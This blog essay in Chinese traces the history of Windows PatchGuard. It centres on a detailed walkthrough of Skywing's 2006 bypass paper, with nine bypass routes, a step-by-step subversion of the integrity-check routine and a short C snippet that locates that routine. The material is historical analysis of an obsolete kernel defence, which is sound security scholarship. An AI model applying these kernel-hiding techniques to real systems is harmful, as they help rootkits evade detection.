---
layout: post
title: "PatchGuard 攻防史（2005–今）：历代绕过与微软的逐版本反制"
categories: essay
---

> 整理自 2026-10-31 对话问答，与《NT PatchGuard（内核补丁保护）实现原理与机制讲透》配套：前篇讲机制，本文按时间线讲这二十年的攻防——从 2005 年 Uninformed 的首度逆向与首破、2006 年的生态战争与 Rutkowska 的盲区地图，到 BYOVD 的野外兑现、EfiGuard 的启动期路线，以及微软把防线搬进 hypervisor 的平台级反制。2026-10-31 扩充版新增：第 2 版策反详解、Tanda 连载精华、GuardMon 与 UPGDSED 详解、Secure Boot / VBS / VTL / HVCI 详解、人物谱附录，以及 Uninformed 三篇原始论文（2005 / 2006 / 2007）的中文全译附录。

---

> 本文与《NT PatchGuard 实现原理与机制》配套：前篇讲它是什么、怎么工作，本文按时间线讲它二十年里被怎样攻击、微软怎样回应、战场怎样一步步转移。事实底座：Uninformed 期刊的三篇原始论文（skape & Skywing 2005、Skywing 2006、Skywing 2007，中文全译见文末附录二至附录四）、Rutkowska 的两次 Black Hat 演讲、微软官方文档与当年新闻报道、Satoshi Tanda 一系的跨版本公开分析。正文讲**机制类别与历史脉络**，不提供针对现行版本的操作细节；附录全译是 2005–2007 年针对已淘汰的第 1–3 版的历史原始文献，按原文完整呈现以备查考。2026-10-31 扩充版新增：第 2 版策反详解、Tanda 连载精华、GuardMon 与 UPGDSED 详解、Secure Boot / VBS / VTL / HVCI 详解与人物谱附录。个别年份以公开发表时间为准，文中已标注来源性质。

## 序：这场仗开局就写好了结局的一半

2005 年 12 月，第一篇系统分析 PatchGuard 的论文在结尾处就把整场攻防的命题说死了：**"不可能靠一个与第三方代码同特权级的监控系统，去安全地保护它要监控的那些代码和数据。"** 驱动与内核同在 ring 0，谁先动手、谁更不透明、谁的触发点更难找，就能赢下一轮——但没有哪一轮是终局。此后二十年的全部历史，都是微软想方设法抬高"每一轮"的成本，攻击者想方设法把成本打回去拉锯。

## 第一幕（2005）：登场与首破，只隔了几个月

**登场**：2005 年，PatchGuard 第 1 版随 Windows XP x64 与 Windows Server 2003 SP1 的 x64 版发布。背景见机制篇：32 位的挂钩生态在新平台上被一次性清零，签名管准入、PatchGuard 管运行时。微软当时对它的宣传口径是"防止 rootkit 与第三方软件破坏内核稳定"。

**首破**：同年 12 月 1 日，skape（Matt Miller）与 Skywing（Ken Johnson）在 Uninformed 期刊第 3 卷发表《Bypassing PatchGuard on Windows x64》——第一份把 PatchGuard 的上下文结构、子上下文、校验清单（系统镜像、SSDT、IDT/GDT、MSR）完整逆向出来的公开文献。论文的姿态值得单独一提：它不是单纯晒绕过，而是**每给出一条绕过路线，就附上一份"微软可以这样堵"的修复建议**。其归纳的攻击面，此后二十年没有本质变化，无非四类：

1. **直接拆哨兵**：定位并改写 PatchGuard 自己的代码或上下文（它的校验值就存在自己家里）；
2. **摘闹钟**：找到并禁掉负责触发检查的定时器/DPC，让检查永远不发生；
3. **钻时间窗**：检查是周期性的，在两次检查之间改、用完改回；
4. **骗对账**：让检查读到一份伪造的"完好"数据（后来 Skywing 在第 2 版上把这一类玩到了极致）。

**微软的回应方式在此后成为惯例**：不在公开场合逐条回应，而是把修复建议连同新发现的洞一起，攒进下一个大版本——顺带一提，这篇论文后来还被 Symantec 的 Vista 安全白皮书拿去当脚注引用，证明"黑客能攻破 PatchGuard"；Skywing 本人是微软 MVP，这场口水本身就是下一幕生态战争的预告片。

## 第二幕（2006）：三线齐发的一年

**技术线——第 2 版与"以彼之盾"**：Vista x64 与打了热修复的 Server 2003 x64 内核换上了 PatchGuard 第 2 版。按 Skywing 随后在 Uninformed 第 6 卷《Subverting PatchGuard Version 2》的归纳，第 2 版的保护清单没大变（SSDT、IDT/GDT、MSR、若干内核全局函数指针、内核代码），**反制重心全在"防拆"上：强化反调试与反补丁，让 ISV 用一个驱动在现场把 PatchGuard 关掉再打补丁的做法难以落地**。论文的结论有两层：其一，第 1 版的大部分绕过在表面上被堵住，但不少只需微调即可复活；其二，也是最漂亮的一击——**他演示了把 PatchGuard 的完整性检查例程本身劫持掉，让它转而执行攻击者的代码**。这一手的毒性在于：PatchGuard 为自保而建的混淆与反调试铠甲，从此变成攻击者的藏身所——检查例程躲在铠甲里照常"巡逻"，只是巡的是假逻；而且事成之后不留内核补丁痕迹、不留可疑驱动。用他自己标题里的词，这叫 Subvert（颠覆），不是 Bypass（绕过）——**哨兵没被拆掉，哨兵被策反了**。

### 骗对账、策反哨兵：PatchGuard 第 2 版的自解密铠甲如何被反穿

> 出处：Skywing，《Subverting PatchGuard Version 2》，Uninformed Vol. 6，2006 年 12 月。本文是对该论文第 3–7 章的中文技术详解，定位是《PatchGuard 攻防史》读者手边的细读材料：不复述第 1 版全貌，只钉死三件事——第 2 版强在哪里、九条绕过路线各自打哪个单点、以及最危险的一条路如何把完整性检查例程本身换成第三方代码。下文凡原文未展开处，均明标「原文未展开」，不以常识补原文没有的细节。

#### 先给术语

- **PatchGuard（内核补丁防护）**：微软在 x64 Windows 内置的完整性巡检机制，周期性核对 SSDT、IDT/GDT、若干 MSR、内核全局函数指针与内核代码等受保护对象，发现未授权修改就触发 `CRITICAL_STRUCTURE_CORRUPTION` 类错误检查（蓝屏）。它要有，是因为 x86 时代第三方驱动任意钩内核已成稳定性与安全灾难；它难做，是因为它与被检查者同在 ring 0——这正是全文的命门。
- **DPC（Deferred Procedure Call，延迟过程调用）**：把「现在不急、稍后在抬高 IRQL 下补做」的工作排队到某颗 CPU 上执行的机制。DPC 例程在 **DISPATCH_LEVEL** 执行，借用被中断线程的内核栈，没有自己的线程上下文。PatchGuard 借合法 DPC 例程当发射台，正是看中它例行、合法、不可随便取消。
- **KTIMER / KDPC**：分别是定时器对象、以及到期后要被分发的 DPC 对象。定时器到期后，内核定时器 DPC 分发器以**函数调用（call）**调用 KDPC 记下的 DPC 例程。PatchGuard 用一次性 KTIMER＋KDPC 每隔数分钟（带随机抖动）点火一次。
- **SEH（Structured Exception Handling，结构化异常处理）**：Windows 的 try/except、try/finally 异常机制。异常发生后，控制先经**异常分发**（异常 → `KiDispatchException` → 按注册表查找并调用 SEH 处理例程）转移。第 2 版故意把「调用检查例程」藏进这条分发链里。
- **_C_specific_handler**：MS C/C++ 编译器为带 SEH 子句的函数统一生成的异常/展开处理例程，由内核导出、几乎所有 C/C++ 内核映像共用。它是这条分发链上人人必经、且微软无法收回导出的关口。
- **DeferredContext**：DPC 例程的第二个参数，本义是 DPC 初始化时登记的任意上下文指针，合法调用时指向各 DPC 私有结构。PatchGuard 点火时故意给它塞一个非法值，让例程第一次解引用就出错——这是整套「骗对账」机关的扳机。
- **规范地址（canonical address）与非规范地址**：当时 AMD 处理器只实现 48 位地址，高位须同号扩展才合法；不合此式的非规范地址解引用立即引发一般保护故障，表现为可被 SEH 接住的 `STATUS_ACCESS_VIOLATION`，且在 DISPATCH_LEVEL 也成立，不会像普通缺页那样蓝屏。原文第 3.4 节即靠这一点造「安全假指针」。
- **RtlVirtualUnwind（虚拟展开）**：按 x64 内嵌的展开元数据，不真正执行各层处理代码，就把一份机器上下文（CONTEXT）回退到调用者帧的导出例程。x64 的异常展开全靠这套元数据——攻击者也因此能干净地「跳过一整层」。
- **detect bit，正名 General Detect bit（通用检测位）**：调试寄存器控制寄存器 Dr7 中的一位，置位后，任何对调试寄存器的访问都会先产生调试陷阱。它本为电路内仿真器（ICE）这类真硬件调试器预留：谁碰调试寄存器，谁先被截获。
- **split TLB（分离式 TLB / TLB 去同步）**：TLB 是虚拟→物理地址翻译的缓存，现代处理器分指令 TLB 与数据 TLB。故意让两者对同一页给出不同视图，执行取指看到补丁后的页、数据读取看到原始页，即所谓 memory cloaking（内存伪装）。

#### ① 第 2 版相对第 1 版强化了什么（第 3 章，3.1–3.8）

先说总账：保护对象本身变化不大，强化的几乎全是**反调试、反分析、反定位**——让攻击者更难找到、更难停住、更难认出检查例程。逐项如下：

1. **初始化期反调试代码（3.1）**。初始化主体借道 `nt!SepAdtInitializePrivilegeAuditing` 例程（见第 6 项的误导命名），其中多处埋着同一构型：执行 `cli` 关中断后比较 `KdDebuggerNotPresent`，若调试器在场便落入 `jmp short $` 式无限循环，最后才 `sti`。原文随即给出差评：这种构型容易被提前扫描定位并摘除；若每次命中时先以有创意的方式破坏执行上下文（如清寄存器、布置延迟发作的失败），再进死循环，效果会稍好。初始化期还高度混淆地随机选「假池标签」（bogus pool tag）和随机分配尺寸增量，用 `rdtsc` 取随机数，令按池特征扫内存定位 PatchGuard 上下文更难。
2. **扩大的 DPC 例程集合（3.2）**。第 1 版只有 3 个可借用的 DPC 例程，第 2 版扩到 10 个（原文列出 `CmpEnableLazyFlushDpcRoutine`、`ExpTimeRefreshDpcRoutine`、`ExpTimerDpcRoutine`、`IopTimerDispatch`、`KiScanReadyQueues`、`PopThermalZoneDpc` 等），启动时用 `rdtsc` 播种随机选定一个，本次会话终身只用这一个。它们各有真实职责，不能见一个取消一个。但原文点明：**整场会话只用一个**这一弱点继承自第 1 版，后文正好用得上。
3. **自解密且自变异的完整性检查例程（3.3）**。检查代码在内存中加密存放，分两层自解密：被选中的 DPC 例程以**函数调用（call）**转入第一层解密桩，桩先逐条解密自己（第一条指令把自身与下一条一并异或解开，链式推进），再循环解密紧随其后的第二层——真正的检查例程，解毕以 `jmp rax` **尾跳转（函数调用类转移，无返回）**进入检查例程，在被中断线程的内核栈、DISPATCH_LEVEL 语境下执行。检查例程返回前把自己重新加密，且**每次执行都更换加密密钥**，于是它每隔几分钟就换一副内存面貌。原文同时留了后门评注：链接到它的 KDPC/KTIMER 是普通系统结构，仍可能成为定位入口。
4. **经 SEH 混淆检查例程的调用（3.4）**。这是第 2 版的机关核心。PatchGuard 给 DeferredContext 塞入一个**非规范地址**假指针；DPC 例程做的第一件实事就是解引用它，于是触发一般保护故障，经**异常分发**（异常 → `KiDispatchException` → `_C_specific_handler` 按四个重叠的 SEH 注册逐项处理）层层接力，最后由其中一个处理例程以**函数调用（call）**直呼解密桩。把一次普通调用拆进四层异常处理，目的就是让人看不出「谁在何时调用检查例程」。代价是：这条异常链也成了人人可截的单点（见 ② 的 4.1–4.3）。
5. **破坏调试寄存器断点（3.5）**。硬件断点不在代码里留 `int 3` 字节，完整性检查看不见，是 PatchGuard 的盲区。对策：检查例程被解出明文后的第一个动作，就是以**函数调用（call）**进入一个小例程（冒名的 `KiNoDebugRoutine`），把 Dr7 清零，一次关掉全部硬件断点。
6. **误导性符号名（3.6）**。微软符号公开可得、又不能收回，于是给内部例程起貌似正经的名字藏身。原文点名的有：`SepAdtInitializePrivilegeAuditing`（初始化主体藏在此名下）、`RtlpDeleteFunctionTable`、`FsRtlMdlReadCompleteDevEx`、`RtlLookupFunctionEntryEx`、`SdbpCheckDll`、`FsRtlUninitializeSmallMcb`、`KiNoDebugRoutine`、`KiFilterFiberContext`。只看符号表，认不出哪个是哨兵。
7. **初始化期就做完整性检查（3.7）**。不等启动后巡检，初始化当场先验自家反调试构件的字节：例如逐字节核对清 Dr7 例程应有的操作码（原文给出 `cmp dword ptr [rax], 230FC033h` 等比对），不对就提前退出初始化。在磁盘上先摘除反调试代码，会在点火前被发现。
8. **启动后覆写初始化代码（3.8）**。初始化完成后，PatchGuard 把 `ntoskrnl` 的 `INITKDBG` 节中大量初始化代码清零，`KiNoDebugRoutine`、`RtlpDeleteFunctionTable` 等在活内存里只剩全零，防事后逆向它如何布防。原文差评：打开磁盘上的内核映像即可绕过。

#### ② 第 4 章的九条绕过路线（4.1–4.9）

九条路线分三类：截异常链的（4.1–4.3）、截调试机关的（4.4–4.5）、不截链而在上游断供或下游藏补丁的（4.6–4.9）。作者只完整实现了 4.1，其余自称「原理上可行」。逐条定位＋原理：

- **4.1 截获 _C_specific_handler**——在异常链的公共关口下钩，抢在检查例程被调用之前改写异常上下文、整层跳过 DPC。原理：检查靠 SEH 点火，而十个 DPC 例程的 SEH 都经这个**导出**符号分发，地址跨版本易得、微软无法收回；截获后用 `RtlVirtualUnwind` 对异常 CONTEXT 做虚拟展开，把上下文回退到 DPC 分发器帧，再向异常分发器返回 `ExceptionContinueExecution`，控制便经**异常分发＋上下文恢复**落回分发器，检查例程根本没被调用。又因 KTIMER 是一次性的、重排定时器的代码也被跳过，PatchGuard 就此整场停摆。过滤也现成：内核态对内核地址的访问违规几乎只可能是 PatchGuard 自导（被访问地址恒为 `0xFFFFFFFFFFFFFFFF`，是非规范地址违规的报告方式）；合法探针校验针对的是用户地址。钩虽是内核补丁，但它会在第一次巡检发现它之前，先把巡检掐掉。
- **4.2 截获 DPC 的异常注册**——不钩公共关口，改逐个改写十个 DPC 例程各自的 SEH 注册，让其处理例程指向自备的虚拟展开桩。原理同 4.1 的后半段，难在定位：DPC 例程不导出，须靠指纹识别（原文给六条判据，如恰有四个 `_C_specific_handler` 作用域、含 `ror/rol` 等稀有指令、被内核代码以裸地址引用至少两次等），且替身处理例程必须落在内核映像基址 4GB 以内（展开元数据里只有 32 位 RVA），驱动映像与池分配一般都不够近——原文称可用改页表等办法，细节未展开。
- **4.3 截获 PsInvertedFunctionTable**——改异常分发器的一份**缓存**而非异常目录本体。`PsInvertedFunctionTable` 是 RIP→所属映像与异常目录的快速翻译缓存（Server 2003 上限 160 项、Vista 512 项）；其中 `ExceptionDirectory` 是完整 64 位指针且无人校验它是否落在所属映像内。把内核那一项改指一份影印异常目录、只动其中 PatchGuard DPC 的处理例程指向，即可在异常分发查表时劫持控制。妙处：内核映像内的异常目录原封未动，比 4.2 更难被「验目录」发现。代价：该表不导出，须以可预测的头部字段做 egghunt 定位。
- **4.4 截获 KiDebugTrapOrFault**——夺下调试异常的总入口，再用硬件断点在任意关键点截停 PatchGuard 路径。`KiDebugTrapOrFault` 是所有调试异常的入口，可经钩它、改 IDT，或借 4.3 改其展开元数据给它挂上 SEH 处理例程等办法夺取（原文列了多条夺取路径，取舍未展开）；夺得后在 DPC 分发器、PatchGuard DPC 或 `_C_specific_handler` 等处下硬件断点，命中时控制经**中断向量**（调试异常 → IDT 向量 → 调试陷阱处理路径）落入自备代码，改写异常上下文后恢复执行。优点：不改代码、无跳转补丁的指令边界难题、可无竞态；难点是保证调试寄存器跨上下文切换不丢。
- **4.5 通用检测位截获（General Detect Bit Interception）**——把 3.5 的反制反过来用：置位 Dr7 的通用检测位后，PatchGuard 检查例程一清 Dr7 就先自投罗网。置位后任何调试寄存器访问都先产生调试陷阱，控制经**中断向量**进入已被夺取的调试陷阱处理路径（夺取办法借 4.4）；据陷阱时 RIP 是否落在正规内核映像内（检查例程住在非分页池、不在任何映像里）即可分辨敌我。命中点正是检查例程明文现身、尚未做任何核对的入口，一次硬返回即可令其「对了个空账」。
- **4.6 补丁定时器 DPC 分发器**——在所有 PatchGuard 点火必经的那一条 call 指令上设伏。办法是先自排一个定时器 DPC，从其返回地址反推分发器里调用 DPC 例程的 call 指令位置，改写该指令使控制以**函数调用（call）**先落入自备过滤代码；判据是「DPC 例程在内核映像内＋DeferredContext 是非规范地址」，命中就直接返回分发器、不调用该 DPC。单点、一击、全灭——这正是原文批评的「漏斗」。
- **4.7 在内存里搜出 PatchGuard 的 DPC 并取消它**——经典 egghunt：扫非分页池找同时满足六条判据的对象（合法 KTIMER 链与类型、间隔数分钟量级、带 KDPC、DPC 例程在内核映像内、DeferredContext 为非规范地址等），找到后取消该定时器/DPC，哨兵便永不点火。只断点火源。
- **4.8 TLB 去同步（split TLB）**——严格说不是绕过而是**藏补丁**：让指令 TLB 与数据 TLB 对同一页给出不同视图，取指执行看到补丁页，数据读取（包括 PatchGuard 逐字节核对代码）看到原始页，账面永远对得平。前提是先钩缺页处理路径，而这个钩本身藏不住，须再叠 4.4/4.5 的调试寄存器机关（原文在此处把 4.4、4.5 误植为 technique 3、5）。x64 上的具体实现，原文明确说超出本文范围、只给参考文献——**原文未展开**。
- **4.9 直接补丁 DPC 例程**——4.2 的简化版：用同样的指纹法找出全部十个 DPC 例程，在每个入口打补丁跳入自备代码：是 PatchGuard 式调用（判据仍是非规范 DeferredContext）就立即返回分发器，合法调用则放行。原理最直白，也最易被反制：改指纹、改 DPC 数量、换点火机制，任一条都能让它失效。

#### ③ 策反全程：让哨兵替你站岗（第 5 章，本文核心）

4.1 只是让哨兵闭嘴；第 5 章要的是让哨兵**换人**——检查例程的位置改放自定义代码，借它的周期点火、它的加密藏身、它的合法身份长期运行，且事后不留补丁与驱动。链条分五步。

##### 第一步：在异常链上截获，拿到 DPC 的机器上下文

沿用 4.1：在 `_C_specific_handler` 处下钩。PatchGuard 的 KTIMER 到期后，分发器以**函数调用（call）**调用被选中的 DPC 例程（DISPATCH_LEVEL，借用被中断线程的内核栈）；例程把原始参数搬上栈并做旋转混淆、故意覆写参数寄存器，然后解引用假 DeferredContext 触发一般保护故障。控制经**异常分发**（异常 → `KiDispatchException` → 调用该 DPC 注册的 `_C_specific_handler`）落入钩子。钩子拿到的，正是故障瞬间 DPC 例程的完整机器上下文。难点是：解密检查例程的指针由 DPC 的两个原始参数（`Dpc` 与 `DeferredContext`）加密导出，而寄存器里的原值已被故意销毁，必须从栈上捞回。

##### 第二步：恢复 DeferredContext——故障寄存器白送一个

原文归纳了十个 DPC 例程在故障点上下文的五条共性，其中两条是钥匙：其一，故障永远发生在解引用 `rax` 时，而 `rax` 里恰是**已去混淆的 DeferredContext 明文**，这个参数等于白送；其二，故障指令的**前一条**永远是 `ror rax, <魔数>`，魔数是指令编码里的立即数，且每个 DPC 例程有自己固定的一颗、跨版本不变——只看它就能认出当前是十个 DPC 中的哪一个，并知道栈上 `Dpc` 参数所用的旋转混淆常数。还有一条是陷阱：`r8` 等于原始 `Dpc` 右移 DeferredContext 低字节后的结果，但右移丢掉的位永远找不回来，`r8` 只能验算、不能当原值。

##### 第三步：暴力搜栈，捞回 Dpc 参数

`Dpc` 在栈上的偏移随 DPC 例程、内核版本、发行版千变万化，无法硬编码，只能在异常时 `rsp` 向上约 256 字节范围内（须覆盖最大的 DPC 局部变量区）按 8 字节对齐逐个候选暴力试。原文给六条筛子：① 只看 8 字节对齐位置（x64 约定保证指针必对齐放）；② 候选值按已知旋转常数去混淆；③ 把去混淆结果右移 DeferredContext 低字节，与 `r8` 比对，不符即淘汰（此条只是优化，可跳过）；④ 用 `MmIsAddressValid` 验它指向有效非分页池地址（原文自承这是有竞态的丑陋技巧）；⑤ 再验该地址后至少还有一个指针宽度的有效空间——KDPC 后紧跟着的正是解密密钥字段；⑥ 把候选当 KDPC 看，其 `Type` 与 `DeferredContext` 字段必须已被清零（DPC 例程点火前会亲手清掉这两项，是 PatchGuard 自留的指纹）。六筛齐下，原文称实测可「以近乎确定」的把握捞回真正的 `Dpc`。

##### 第四步：由两个参数算出检查例程地址——原文代码逐行解

两个参数齐了，定位检查例程只需三行。原文（第 5 章）原样如下：

```c
ULONG64 DecryptionKey, PatchGuardCheckFunction;

DecryptionKey            = *(PULONG64)(Dpc + 0x40);
PatchGuardCheckFunction  = DecryptionKey ^ DeferredContext;
PatchGuardCheckFunction |= 0xFFFFF80000000000;
```

逐行讲：

- 第 1 行只声明两个 64 位变量：一个装密钥，一个装最终的检查例程（实为解密桩）地址。
- 第 2 行 `DecryptionKey = *(PULONG64)(Dpc + 0x40);`：把恢复出的 `Dpc` 指针加 `0x40`（64 字节，正好越过 KDPC 本体），把紧随 KDPC 的那个指针宽度字段取出来——它就是解密密钥。**密钥不另存，它就寄存在 DPC 对象身后**，这也是第三步第 ⑤ 条筛子要求「KDPC 后至少还有一个指针宽度空间」的原因。
- 第 3 行 `PatchGuardCheckFunction = DecryptionKey ^ DeferredContext;`：密钥与 DeferredContext 异或，得到检查例程地址的**低位部分**。这正是 PatchGuard 的加密方式：指针不以明文出现，而是拆成「密钥 ⊕ 一个随 DPC 参数而来的值」，单独看都认不出目标。
- 第 4 行 `PatchGuardCheckFunction |= 0xFFFFF80000000000;`：**补高位**。异或的结果只在低 48 位（乃至更低）里有意义，高 16 位是空的，这样一个值既不是合法的内核地址、更不是规范地址，直接拿去跳转或写内存都会出问题。而 x64 Windows 的内核映像与 PatchGuard 代码所在的系统地址空间，固定栖身于以 `0xFFFFF800'00000000` 为基的高半区——把这个常量按位或上去，等于把「相对偏移」拼回成完整的、规范形式的 64 位内核虚拟地址。少了这一行，前两行算出的只是半个地址；有了这一行，才真正摸到解密桩在内存里的门牌号。

##### 第五步：替换检查例程——两条被迫的 xor 指令与自备点火

替换目标不是检查例程本体，而是它前面的**解密桩**：算出的地址指向桩首，覆写这块动态分配内存里的代码，日后 DPC 的 SEH 处理例程以**函数调用（call）**直呼桩首时，跑起来的就是自定义代码。但桩首第一条指令没得选：处理例程在调用桩之前，会亲手把桩首改写成 `lock xor qword ptr [rcx],rdx`（`rcx`＝桩自身地址，`rdx`＝解密密钥；这条 4 字节指令异或 8 字节，效果是解密自身连同下一条指令）。原文的解法是把第二条指令也写成同一条 `lock xor qword ptr [rcx],rdx`，并在交还控制前预先把第二条加密：第一条执行后把头 8 字节再异或一次，第二条便恢复明文、顺带把第一条重新加密，自定义代码从第三条起自由书写。交还控制的方式是让 `_C_specific_handler` 的正常分发继续走完——异常分发链走完后，处理例程调用桩首，控制经**函数调用（call）**落入自定义代码；其执行上下文与原检查例程完全相同：仍在那次 DPC 点火的异常处理语境里、DISPATCH_LEVEL、借用被中断线程的内核栈——身份是哨兵，干活的是入侵者。

还有一个必须自补的环节：KTIMER 是一次性的，原检查例程本负责给自己重排下一次点火；自定义代码若不接管，哨兵只站这一班岗。为此它要主动排一个新定时器，关联的 DPC 例程正是启动时被选中的那一个——点火节奏、借用身份全部原样保留。

##### 第六步：借铠甲藏身，事后不留痕

策反成立后，原先保护 PatchGuard 的整套铠甲原地转手保护自定义代码：它住在 PatchGuard 动态分配的内存里，参数块可塞在自定义代码之后、原解密桩与检查例程的地盘上，运行时以第一个参数 `rcx`（指向自身）加固定偏移即可取到，不依赖任何驱动映像内的地址。收尾动作是连环的：① 摘掉 `_C_specific_handler` 上的钩，再以**函数调用（call）**回调原函数让本次分发走完——钩在完成使命的当场消失；② 实施策反的驱动随即**卸载**，系统中不再有可疑驱动驻留；③ 已卸载模块列表可再改（原文只说「easily modified」，改法未展开）；④ 自定义代码还可进一步给自己套上自解密，连密钥都换成与 PatchGuard 不同的那一把，只在执行前一瞬解密——示例程序并未实现每次换钥与全程加密，原文称这两样「很容易加上」，**其具体实现原文未展开**。终局状态原文说得干净：内核代码与全局数据上**没有任何补丁残留**，没有可疑驱动、甚至没有可疑的额外内存分配；剩下的唯一痕迹，是那段被改写的检查例程本身——只有本来就知道如何定位 PatchGuard 的人，才找得到它。

#### ④ 论文给微软的修复建议（逐条搜集，注明出处）

- **放弃以 SEH 作为点火核心机制**（4.1 节末）：拆掉异常链这个公共关口，4.1 的版本无关截获即失去支点；原文另提「预先校验异常处理路径」作为备选，但判断微软不太会走这条较不优雅的路。
- **校验展开元数据与 SEH 处理例程的归属**（4.2 节末）：预校验展开元数据、或在异常分发器里核实登记的 SEH 例程地址确实落在该映像范围内，可封 4.2，并顺带堵住一类映像外处理例程滥用；作者预期这会出现在未来版本中。
- **改变 DPC 例程的可指纹特征**（4.2 节末，兼 4.9 的反制）：调整 DPC 例程特征挫败指纹定位；对 4.9 还可改变 DPC 数量、或换掉点火机制。
- **校验 PsInvertedFunctionTable 的缓存指针**（4.3 节末）：核实其中 `ExceptionDirectory` 指针落在所属映像范围内、进而要求其指向只读内存；原文承认这并非万无一失（映像内可改的大数组仍可被借用），但能显著抬高门槛。作者另警告：该表还能被用来劫持全内核异常分发且现行 PatchGuard 完全看不见，是 rootkit 的理想藏身处。
- **加固调试陷阱路径、并让关键路径难以被稳定定位**（4.4 节末）：加强对调试陷阱处理例程的完整性校验；同时让关键代码路径跨版本难以被第三方驱动可靠定位。作者对此悲观：内核经导出符号、IDT 标签、展开元数据暴露太多，彻底绝缘很艰巨。
- **别简单删掉清 Dr7 的行为**（4.5 节末）：删之固然封死检测位路线，却会让「给内核代码下读断点等 PatchGuard 来读」成为新的简易定位法；较可行的方向是让 PatchGuard 访问调试寄存器与合法访问难以区分，并辅以对调试陷阱路径的校验——作者同样判断前者「很可能做不到」。
- **点火机制多样化、消灭漏斗**（4.6 节末，4.7 附议）：改用多种机制点火检查例程，如专职线程等定时器、或让高频系统例程周期性顺带调用检查；只要点火都汇经同一分发路径，整个系统就系于一个单点。
- **堵住缺页处理钩子的藏身法**（4.8 节末）：split TLB 本身无法藏住缺页处理例程这个必驻的钩，关键在察觉该钩；若钩借调试陷阱＋硬件断点实现，则封堵调试陷阱截获（尤其加固 PsInvertedFunctionTable）即可连带破之。具体对策随藏钩手法而变，原文未给一揽子方案。
- **反调试构型应改为「破坏上下文」而非死循环**（3.1，属强化建议）：见 ① 第 1 项，此处不重复。
- **系统性建议（第 6 章）**：按高可用系统的思路消除单点故障、给每条关键路径加冗余，使通向检查例程的每一步都有多条代码路径可达；更进一步，把**关键系统功能与检查例程熔合**——绕过检查即等于绕过系统必需功能，逼攻击者去复刻或剥离关键功能，这正是混淆与反调试最能发挥价值的战场；终极方向是把防护下沉到 hypervisor：第三方驱动不再与防护同级，配合写一次内存从事后检测转为事前防改。作者同时泼冷水：只要调试寄存器为内核调试器保留，借它改执行上下文的路就堵不干净。

#### ⑤ 结论：混淆式防护的根本局限与双刃剑（第 6、7 章）

**第一，混淆只抬价，不设防。** 第 6 章的核心判断是：攻击者永远挑最弱一环下手，「再多的混淆与加密，只要攻击者能把一个 `jmp` 改成 `nop`、让精心设计的加密与反调试设施根本没机会运行，就都白搭」。第 2 版把铠甲做厚了，却没动第 1 版的骨架性单点：一个 DPC、一座定时器、一道异常链、一个导出符号关口——每条路线往往只需攻破其中一处，整个系统即告失效。第 2 版「几乎没有改善这个系统最弱的环节」。

**第二，这是同级对抗的结构性困局。** PatchGuard 与它要防的第三方驱动同处 ring 0：它能读的内存对方能读，它能改的指针对方能改，它赖以点火的 DPC、定时器、SEH、展开元数据，全是双方共用的公共设施。它唯一真正的武器是「藏」——藏位置、藏时机、藏面貌；藏得再好也只是抬高定位成本，不能把「能改」变成「不能改」。出路因此只有两条：要么熔合关键功能，让「拆掉哨兵」等于「拆掉系统」；要么请来更高一级的裁判——hypervisor，把检查者抬到被检查者够不着的特权层。换言之：**在同级之内，这个问题无解；解法全在改变级别本身。**

**第三，双刃剑：防护技术与藏匿技术是同一套技术。** 第 5 章开篇与第 7 章反复申说：自解密、反调试、反逆向、随机化藏身，本就是病毒与 rootkit 的看家本领；用在正道上也没有改变它们的性质——**谁穿上这身铠甲，谁就获得同等的不可见性**。策反一节证明的不是「铠甲有洞」，而是「铠甲可转让」：一旦入侵者接管检查例程，他继承的是连杀毒与反 rootkit 软件都难以分析的藏身之所，且现场比普通 rootkit 更干净（无补丁、无驻留驱动）。PatchGuard 因此可能反过来成为恶意内核代码「非常难以检测」的庇护所——这是作者对它价值评估里最重的一笔负项。

**第四，账要算全：它并非一无是处，但代价真实存在。** 第 7 章承认，逼 IHV/ISV 清理糟糕的内核代码、减少系统不稳定与提权漏洞，是合理且惠及所有用户的目标。负项除双刃剑外还有创新被扼：微软自家的 Virtual Server 2005 R2 SP1（Beta）都撞上 PatchGuard、需专门热修复调整保护范围才能运行——「绝不开例外」先为自家代码破例，证明被禁技术确有正当用途，也让作者质疑第三方能否得到同样宽免。作者还补一刀：即便有了 hypervisor 与不可变内存，驱动仍同处一域、经设备栈直接往来，补丁不了内核还可以补丁 `Ntfs.sys`、`Tcpip.sys`，「驱动互不干涉」恐怕永远不会到来。

**第五，出路在把代码请出内核。** 第 7 章结尾落在 UMDF（用户模式驱动框架）上：微软已经走在让有缺陷的驱动既崩不了系统、也补丁不了彼此的路上，即把第三方代码从内核移进用户模式进程这类受控容器——与 PatchGuard「提高稳定性」的目标一致，只是手段从「在内核里站岗查人」换成了「根本不让闲人进内核」。作者保留的疑问是：用户模式驱动能否胜任 PCI/PCI Express 这类高性能设备，而不只是 USB 设备的一小块地盘——**其后来的实际演进，原文未展开**。

收束全篇：九条绕过与一次完整策反，演示的其实是同一件事——检查者用尽心机隐藏自己，却始终站在被检查者的枪口所及之处；当入侵者找到他时，迎接他的不是处决，而是一套现成的隐身衣。「策反之所以成立，不是因为 PatchGuard 太弱，而是因为检查者与被检查者同级——哨兵的铠甲，脱下来就能给入侵者穿。」

**生态线——安全厂商的公开抗议**：2006 年秋，Symantec、McAfee 公开指责 PatchGuard 把他们挡在内核之外、质疑微软借安全之名行垄断之实（微软刚推出自家安全产品 OneCare），并把争端捅到欧盟委员会。在反垄断压力下，微软于 2006 年 10 月让步：承诺为安全厂商提供访问内核的 API。后续时间线是：2006 年 12 月 19 日微软向厂商发出 API 草案、初步反馈转正；API 随 Vista SP1 落地。但微软自始至终守住一条底线（微软的 Stephen Toulouse 的原话大意，其职务口径与人物背景见附录一人物谱）：这些 API 让厂商"在不禁用、不削弱内核补丁保护的前提下扩展内核功能"——**可以给正门钥匙，但绝不允许恢复挂钩**。2007 年 1 月，微软发布《Kernel Patch Protection: Frequently Asked Questions》公开答疑，把"为什么不开放挂钩"写成了官方立场。这场争论的长期产物，就是今天驱动生态的正门全家桶——过滤管理器（minifilter）、WFP、进程/线程/对象/注册表回调：**PatchGuard 的一半历史不在技术里，在这场生态谈判里**。

